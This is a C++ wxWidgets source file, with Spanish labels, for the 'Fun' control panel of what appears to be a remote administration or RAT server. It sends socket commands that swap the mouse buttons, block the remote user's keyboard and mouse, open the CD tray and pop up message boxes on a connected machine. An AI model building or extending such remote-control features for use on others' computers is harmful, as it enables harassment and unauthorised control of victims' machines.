#include "panel_fun.hpp"
#include "server.hpp"

extern Servidor* p_Servidor;

wxBEGIN_EVENT_TABLE(panelFun, wxPanel)
	EVT_BUTTON(EnumFunIDS::ID_BTN_Msg, panelFun::OnMsg)
	EVT_TOGGLEBUTTON(wxID_ANY, panelFun::OnToggle)
wxEND_EVENT_TABLE()

panelFun::panelFun(wxWindow* pParent, SOCKET _socket)
	:wxPanel(pParent, EnumFunIDS::ID_Main_Window) {
	this->sckSocket = _socket;

	//Mouse y teclado
	this->btn_Swap = new wxToggleButton(this, EnumFunIDS::ID_BTN_Swap, "SWAP Mouse");
	this->btn_BlockIn = new wxToggleButton(this, EnumFunIDS::ID_BTN_Block, "Bloquear Entrada (Mouse/Teclado) - ADMIN");

	//CD
	this->btn_CD = new wxToggleButton(this, EnumFunIDS::ID_BTN_CD, "Abrir lectora CD");

	//MessageBox
	wxArrayString arr;
	arr.Add("MB_ABORTRETRYIGNORE");
	arr.Add("MB_CANCELTRYCONTINUE");
	arr.Add("MB_HELP");
	arr.Add("MB_OK");
	arr.Add("MB_OKCANCEL");
	arr.Add("MB_RETRYCANCEL");
	arr.Add("MB_YESNO");
	arr.Add("MB_YESNOCANCEL");

	wxArrayString arr2;
	arr2.Add("MB_ICONERROR");
	arr2.Add("MB_ICONQUESTION");
	arr2.Add("MB_ICONWARNING");
	arr2.Add("MB_ICONINFORMATION");


	this->txtMensaje = new wxTextCtrl(this, wxID_ANY, "Mensaje");
	this->txtTitulo = new wxTextCtrl(this, wxID_ANY, "Titulo");
	this->cmbBotones = new wxComboBox(this, wxID_ANY, "", wxDefaultPosition, wxDefaultSize, arr, wxCB_READONLY);
	this->cmbTipoMsg = new wxComboBox(this, wxID_ANY, "", wxDefaultPosition, wxDefaultSize, arr2, wxCB_READONLY);
	wxButton* btn_Msg = new wxButton(this, EnumFunIDS::ID_BTN_Msg, "Mostrar");

	wxBoxSizer* main_sizer = new wxBoxSizer(wxVERTICAL);

	main_sizer->Add(btn_Swap);
	main_sizer->Add(btn_BlockIn);
	main_sizer->AddSpacer(20);
	main_sizer->Add(this->txtMensaje);
	main_sizer->Add(this->txtTitulo);
	main_sizer->Add(this->cmbBotones);
	main_sizer->Add(this->cmbTipoMsg);
	main_sizer->Add(btn_Msg);
	main_sizer->AddSpacer(20);
	main_sizer->Add(this->btn_CD);

	this->SetSizer(main_sizer);
}

void panelFun::OnMsg(wxCommandEvent& event) {
	wxString strMsg = this->txtMensaje->GetValue();
	strMsg += "<ravdo>";
	strMsg += this->txtTitulo->GetValue();
	strMsg += "<ravdo>";

	UINT type1 = this->mapa_uint[this->cmbBotones->GetValue().ToStdString()];
	UINT type2 = this->mapa_uint[this->cmbTipoMsg->GetValue().ToStdString()];

	UINT res = (type1 | type2);
	
	strMsg += std::to_string(res);

	p_Servidor->cChunkSend(this->sckSocket, strMsg.c_str(), strMsg.size(), 0, false, EnumComandos::Fun_Msg);
}

void panelFun::OnToggle(wxCommandEvent& event) {
	int id = event.GetId();
	int iComando = 0;
	int iBoolean = 0;
	if (id == EnumFunIDS::ID_BTN_Block) {
		iComando = EnumComandos::Fun_Block_Input;

		if (this->btn_BlockIn->GetValue()) {
			this->btn_BlockIn->SetLabelText("Desbloquear Entrada (Mouse/Teclado) - ADMIN");
			iBoolean = 1;
		}else {
			this->btn_BlockIn->SetLabelText("Bloquear Entrada (Mouse/Teclado) - ADMIN");
			iBoolean = 0;
		}
	}else if (id == EnumFunIDS::ID_BTN_Swap) {
		iComando = EnumComandos::Fun_Swap_Mouse;
		iBoolean = this->btn_Swap->GetValue() ? 1 : 0;
	}else if (id == EnumFunIDS::ID_BTN_CD) {
		iComando = EnumComandos::Fun_CD;
		
		if (this->btn_CD->GetValue()) {
			iBoolean = 1;
			this->btn_CD->SetLabel("Cerrar lectora CD");
		}else {
			iBoolean = 0;
			this->btn_CD->SetLabel("Abrir lectora CD");
		}
	}

	std::string strPaquete = std::to_string(iBoolean);

	p_Servidor->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, false, iComando);
}